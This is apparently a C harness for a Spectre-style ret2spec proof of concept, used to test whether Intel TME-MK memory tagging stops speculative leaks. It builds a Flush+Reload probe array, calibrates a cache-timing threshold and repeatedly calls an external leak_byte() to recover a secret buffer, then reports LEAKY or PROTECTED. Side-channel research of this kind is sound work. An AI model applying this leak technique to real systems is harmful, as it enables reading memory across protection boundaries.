#include <assert.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "colorcodes.h"

#define MEASUREMENTS 100000

extern uint64_t runs;
extern uint64_t pagesize;
extern uint64_t threshold;
extern uint64_t secretstringlen;
extern int freq;
extern char secretstring;
extern char *_mem;
extern char *mem;
extern char *secret;
extern char *leaked;

extern uint64_t detect_flush_reload_threshold(void *addr);
extern void flush_shared_memory();
extern void slow_return(void *addr);
extern void perform_flush_reload();
extern void speculate();
extern char leak_byte(int index);
extern void dead_code();

/********************************************************************
TME-Box code.
Source: https://github.com/IntelLabs/TME-MK-Fine-Grained-Encryption-Integrity/blob/502f9c1f9bdd73f9f7731633916e680fe9835608/test.c
********************************************************************/
#define CLSIZE 64
#define CLMASK (uintptr_t)(CLSIZE - 1)

uint64_t kPtrTagMask = 0x00003f0000000000uLL;
#define _read8_q(ptr)                                                          \
  ({                                                                           \
    volatile uint64_t __result = 0xDEAD;                                       \
    __result = (*(volatile uint64_t *)(ptr));                                  \
    __result;                                                                  \
  })
#define _write_q(ptr, value)                                                   \
  do {                                                                         \
    (*(volatile uint64_t *)(ptr)) = (uint64_t)(value);                         \
  } while (0)
#define _is_tagged(ptr) ((uint64_t)(ptr) & kPtrTagMask)
#define _is_aligned(ptr) (((uintptr_t)(p) & CLMASK) == 0)
#define _check_access(ptr)                                                     \
  do {                                                                         \
    if ((uintptr_t)ptr != 0 && (uintptr_t)ptr != -1ULL) {                      \
      uint64_t _expected = 0xFF00000000000000ULL | (uint64_t)ptr;              \
      volatile uint64_t _result = 0;                                           \
      volatile uint64_t _previous = _read8_q(ptr);                             \
      _write_q(ptr, _expected);                                                \
      _result = _read8_q(ptr);                                                 \
      assert(_result == _expected);                                            \
      _write_q(ptr, _previous);                                                \
    }                                                                          \
  } while (0)

void *check(void *p) {
  printf("p = %15p  ", p);

#if defined(SCENARIO1) || defined(SCENARIO2) || defined(SCENARIO3)
  assert(_is_aligned(p));
  printf("[OK] aligned. ");

  assert(_is_tagged(p));
  printf("[OK] tagged. ");

  _check_access(p);
  printf("[OK] access. ");
#endif

  printf("\n");
  return p;
}

/********************************************************************
PoC code.
Source: selfmade
inspired by https://github.com/google/safeside/blob/main/demos/ret2spec_callret_disparity.cc
********************************************************************/
void exit_enomem() {
  printf("ERROR: ENOMEM: malloc returned Null!\n");
  exit(-1);
}

int main() {
  pagesize = sysconf(_SC_PAGESIZE);
  
  _mem = malloc(pagesize * 260);
  if (!_mem)
    exit_enomem();
  
  mem = (char *)(((uint64_t)_mem & ~(pagesize - 1)) + 2 * pagesize);
  for (int i = 0; i < 256; ++i) {
    memset(&mem[i * pagesize], (char)i, pagesize);
  }

  threshold = detect_flush_reload_threshold(mem);

  secret = check(malloc(128));
  if (!secret)
    exit_enomem();
  memset(secret, 0x20, 128);
  memcpy(secret, &secretstring, secretstringlen);

  leaked = check(malloc(128));
  if (!leaked)
    exit_enomem();
  memset(leaked, 0x20, 128);
  leaked[secretstringlen - 1] = 0;

#if defined(EXEC_PREV)
  void *fp = dead_code;
  assert(((uint64_t)fp & 0xFFF) == 0);
  mprotect(fp, pagesize, PROT_READ | PROT_WRITE);
#endif
  // printf("dead code @ %p\n", dead_code);

  int score = 0, max = 0;
  for (int run = 0; run < MEASUREMENTS; ++run) {
    int i = run % (secretstringlen - 1);
    char c = leak_byte(i);
    if (' ' <= c && c <= '~') {
      leaked[i] = c;
    }
    score += (c == secret[i] && c != ' ' && c != '\0');
    if (secret[i] != ' ' && secret[i] != '\0') max += 1;
  }

  printf("secret: %s\n", secret);
  printf("leaked: "FG_YELLOW"%s"RESET"\n", leaked);
  printf(FG_YELLOW"SCORE: %d/%d"RESET"\t>>> %s <<<\n", score, max, score > 0 ? FG_RED"LEAKY"RESET : FG_GREEN"PROTECTED"RESET);

  free(leaked);
  free(secret);
  free(_mem);

  return 0;
}

